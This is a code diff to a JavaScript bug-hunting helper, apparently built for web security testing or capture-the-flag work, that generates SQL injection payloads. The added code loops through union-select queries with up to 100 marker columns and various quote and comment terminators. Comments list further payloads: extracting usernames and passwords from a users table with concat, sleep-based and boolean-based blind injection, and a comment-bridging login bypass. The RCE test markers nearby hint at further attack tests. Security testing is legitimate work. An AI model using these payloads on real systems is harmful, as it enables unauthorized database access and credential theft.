@@ -36,27 +36,59 @@ function JsBugHuntingHelper () {
   const payloadsSQLi = [
     { previousAction: previousErrorBasedSqliAction, payloadString: '"', expectedResult: errorBasedSqliResult },
     { previousAction: previousErrorBasedSqliAction, payloadString: "'", expectedResult: errorBasedSqliResult }
-
-    // i must cycle aat least from 1 to 100 columns
-    // i can use the separator at the end for example --
-
-    // "' union select '918273645"
-    // '" union select "918273645'
-    // "' union select 918273645"
-    // "0 union select 918273645,918273645,918273645"
-    // "0' union select '928475','928475"
-    // '0" union select "928475","928475'
-    // "0 union select 928475,928475"
-
-    // for bool based query, for example sql6, you see the true or false result from the size of page difference
-    // the same thing is for time based queries. you see if you have success from the response time
-
-    // you can have also bridge sql injection
-    // select name from table where username='$username' and password='$password'
-    // $username = admin'/*
-    // $password = '*/ --
-    // then you'll have SELECT * FROM `users` WHERE username ='Admin'/* and password=''*/
   ]
+
+  // union based queries
+
+  const unionSelectSQLiResult = "data.indexOf('918273645') !== -1"
+  const eof = ['', '--', '#']
+
+  const sqliQuery = []
+  sqliQuery[0] = { originalQuery: "' union select '918273645", addend: ",'918273645", finalQuote: ['', "'"] }
+  sqliQuery[1] = { originalQuery: '" union select "918273645', addend: ',"918273645', finalQuote: ['', '"'] }
+  sqliQuery[2] = { originalQuery: "' union select 918273645", addend: ',918273645', finalQuote: [''] }
+  sqliQuery[3] = { originalQuery: '0 union select 918273645', addend: ',918273645', finalQuote: [''] }
+
+  for (let q = 0; q < sqliQuery.length; q++) {
+    // console.log('q', q)
+    let payload = sqliQuery[q].originalQuery
+
+    // addend cycle
+    for (let i = 0; i < 100; i++) {
+      // console.log('i', i)
+      payload += sqliQuery[q].addend
+
+      // the end of line can be empty, or -- or #
+
+      // special injections
+      // "0' union all select concat(username,'#',password),concat(username,'#',password) from users"
+      // time based
+      // 0' union select sleep(5),'
+      // bool based
+      // 0' or 1!=1 # results in PAGE SIZE with bool false response, intead of 0' or 1=1 # that results page with bool true response (different page size)
+
+      // for bool based query, for example sql6, you see the true or false result from the size of page difference
+      // the same thing is for time based queries. you see if you have success from the response time
+
+      // you can have also bridge sql injection
+      // select name from table where username='$username' and password='$password'
+      // $username = admin'/*
+      // $password = '*/ --
+      // then you'll have SELECT * FROM `users` WHERE username ='Admin'/* and password=''*/
+
+      for (let fq = 0; fq < sqliQuery[q].finalQuote.length; fq++) {
+        const payloadWithQuotes = payload + sqliQuery[q].finalQuote[fq]
+
+        for (let e = 0; e < eof.length; e++) {
+          // console.log('e', e)
+          const payloadWithQuotesEof = payloadWithQuotes + eof[e]
+
+          payloadsSQLi.push({ previousAction: previousErrorBasedSqliAction, payloadString: payloadWithQuotesEof, expectedResult: unionSelectSQLiResult })
+        }
+      }
+    }
+  }
+  // payloadsSQLi.forEach((v) => console.log(v.payloadString))
 
   const previousRceAction = "data = data.replace('echo+TEST_RCE','').replace('echo TEST_RCE','').replace('/testRCE.php','').replace(\"'TEST_RCE'\",'')"
   const genericRceResult = "data.indexOf('TEST_RCE') !== -1"
